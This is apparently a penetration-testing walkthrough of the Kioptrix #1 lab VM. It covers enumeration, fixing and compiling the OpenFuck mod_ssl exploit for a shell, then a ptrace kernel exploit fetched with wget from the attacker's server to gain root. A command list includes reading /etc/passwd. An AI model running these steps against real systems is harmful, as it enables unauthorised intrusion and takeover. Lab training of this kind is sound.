# **Vulnerable System** : 192.168.20.139 (Kioptrix #1)

**Operating System** : Red Hat Linux 7.3

**Kernel** : 2.4.7

**Vulnerability Exploited** : Apache mod\_ssl/Apache-SSL Buffer Overflow Vulnerability

**Exploit Used** : Apache mod\_ssl \&lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow

**Proof of Concept Code** : [https://www.exploit-db.com/exploits/764](https://www.exploit-db.com/exploits/764)

**Vulnerability Explained** :  A buffer over flow vulnerability exists in mod\_ssl versions before 2.8.7. When mod\_ssl attempts to cache a session that is too large the excessive code spills into the memory allowing a shell payload to be executed. The obtained shell will have privileges of the web user (apache), however this can allow for further exploitation.

**Vulnerability fix** : Update mod\_ssl to version 2.8.7 or above. Implement patch management program.

**Severity** : **High**

**Privilege Escalation Vulnerability** : Linux Kernel Privileged Process Hijacking Vulnerability

**Exploit Used** : Linux Kernel 2.2.x/2.4.x (RedHat) - &#39;ptrace/kmod&#39; Local Privilege Escalation

**Proof of Concept Code** : [https://www.exploit-db.com/exploits/3](https://www.exploit-db.com/exploits/3)

**Privilege Escalation Vulnerability Explained:** Process Hijacking vulnerability uses ptrace() system call. It attaches itself to misconfigured root process and allows the attacker to escalate privileges.

**Vulnerability fix** : Update the kernel to the newest version possible. Implement patch management program.

**Severity** : **High**

## Information Gathering.

### Arp-scan

Discovering the vulnerable system with arp-scan -l:


![arp-scan](https://github.com/lifesfun101/Offensive-Security/raw/master/Walkthroughs/Kioptrix/arp_scan.png)

### nmap

All ports nmap scan:


\*Note: Nmap -p- flag scans all TCP ports from 1 to 65535.

Nmap version and default script scan:


\*Note:

-p specifies the ports to scan

 -sV flag attempts to determine service and version information for given ports

-sC flag utilizes a default set of nmap scripts

### Web Ports Enumeration

Nikto enumeration of port 80:


\*Note: Nikto scans a web application for vulnerabilities.

Gobuster enumeration of port 80:


\*Note: Gobuster discovers hidden web directories. -u flag is used to specify the url and -w flag is used to specify the wordlist to be used.

Browser enumeration of port 80:


Nikto enumeration of port 443 fails due incompatible SSL protocols, however the information we got from scanning port 80 seems to present the SSL vulnerabilities.


On most occasions this problem can be fixed by editing openssl.cnf file located at /etc/ssl/openssl.cnf in Kali Linux, however it did not work this time.

The usual work around is to downgrade MinProtocol parameter to TLSv1.0 and to comment out CipherString parameter as per screenshot below:


Gobuster enumeration of port 443:


\*Note: -k flag is used to skip SSL certificate verification for HTTPS(port 443)

Browser enumeration of port 443:


The website seems to be the exact replica of what we found on port 80.

## Threat Modeling &amp; Vulnerability Identification

A specific line that catches attention in Nikto scan is:


### Searchsploit

Searchsploit tool can be used to search for vulnerability presented by Nikto in exploit-db database:


2 exploits were discovered, version 1 and version 2. Assuming that version 2 is newer, that&#39;s the exploit that will be used.

To get full path and URL references for the specific exploit -p \&lt;exploit id\&gt; flag can be used with searchsploit:


-p flag also copies the exploit&#39;s path to clipboard, which makes it easier to copy and paste it when copying the file to the folder one is working in.


Cp is the copy command, followed by the path to the exploit, and the dot tells cp to copy the file to the current directory.

### Exploit Reviewing, Debugging, Fixing and Compilation

Now it&#39;s time to compile and run the exploit.


As can be seen from the output there was a lot of errors compiling the exploit, which ultimately resulted in failure.

This happens with a lot of old exploits as the Operating Systems and their components change. In a lot of cases debugging and fixing the exploits yourself is needed or finding exploits that are updated or have been fixed by another good fella.

The mistake that has been made is the assumption that the exploit will work out of the box. The exploit file also has not been opened in order to see what it does.

**Always open and get familiar with exploits to see exactly what they do and how they work. Exploit-db&#39;s exploits are generally safe, but you never know what you can find in the wild and what kind of consequences an unknown exploit can do to your systems.**

Reviewing the exploit:


Right at the top there&#39;s a helpful note from exploit-db which gives us a link to a page that tells us how to update the exploit:

[http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/)

\*Note: The exploit tells us to use -lcrypto flag when compiling the exploit. At first compilation attempt the -lcrypto flag was not used.

Let&#39;s follow the guide. (If nano is used as an editor alt+shift+3 will show you line numbers, if that makes following the guide easier)

First, new headers have to be added:


Following the URL has to be updated:


Next const need to be added to unsigned char \*p, \*end declaration of variables:


After doing so, save the exploit and exit to compile.


Tada, there are no errors. The exploit was successfully compiled.

Checking the exploit requirements.


As can be see from the image about, the output provides us with Usage example and Offset&#39;s for numerous operating systems.

Nmap output provided the operating system information and apache version:


The list can be analyzed manually or to make it easier grep can be used to find out which is the suitable option:


The exploit&#39;s output gets piped to grep, which looks for instance of Red Hat operating system. The output then gets piped to another grep which looks for apache version that was discovered.

This leaves 2 options, and now there is enough information to run the exploit.

## Exploitation

### Low Privilege Exploitation

Since the exploit uses SSL it needs to be launched against port 443.


The low privilege shell has now been obtained.

### Privilege Escalation Enumeration

Now it&#39;s time for some basic enumeration in order to find out privilege escalation vector.


As can be seen from above, this is Red Hat Linux 7.2 (which has been already discovered) and kernel version 2.4.7.

ifconfig command did not work, meaning other commands (and exploits) might not work too due to the default path not being set. This can be fixed by exporting the PATH variable, as shown below.


Continue enumerating the system further.

Cat /etc/passwd | grep bash will provide a list of users present on the system.


find / -perm -u=s -type f 2\&gt;/dev/null will profile all files with SUID privileges:


By typing gcc, a compiler installation can be confirmed:


After doing quick enumeration the results can be looked over to find an exploit vector.

The first vector is kernel.

### Privilege Escalation

Again, searchsploit can be used to find an appropriate kernel exploit:


Due to victim&#39;s system having a compiler, the exploit can be transferred to the attacker&#39;s webserver, downloaded to the victim&#39;s system and compiled on the system as show below.

On Kali the file is copied to the web server directory (do not forget to start the webserver with service apache2 start):


On the victim&#39;s system a world writeable folder should be found and switched into (most of the times /tmp or /dev/shm folders do the job). After that wget command is used to download the exploit from the attacker&#39;s machine and gcc command is used to compile the exploit.


Tada, root has been obtained.

# Summary of the Commands Used

arp-scan -l

nmap -p- 192.168.20.139

nmap -sV -sC -p 22,80,111,139,443,1024 192.168.20.139

nikto -h 192.168.20.139

gobuster -u 192.168.20.139 -w /usr/share/wordlists/dirb/common.txt

gobuster -k -u https://192.168.20.139 -w /usr/share/wordlists/dirb/common.txt

searchsploit mod\_ssl 2.8.7

searchsploit -p 764

gcc 764.c -o exploit -lcrypto

./exploit | grep &quot;RedHat&quot; | grep &quot;1.3.20&quot;

./exploit 0x6b 192.168.20.139 80

uname -a

cat /etc/\*-release

cat /etc/passwd | grep bash

PATH=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games&quot;

find / -perm -u=s -type f 2\&gt;/dev/null

gcc

searchsploit Kernel 2.4. red hat

service apache2 start

searchsploit -p 3

cp /usr/share/exploitdb/exploits/linux/local/3.c .

wget [http://192.168.20.7/3.c](http://192.168.20.7/3.c)

gcc 3.c -o exp

./exp

whoami

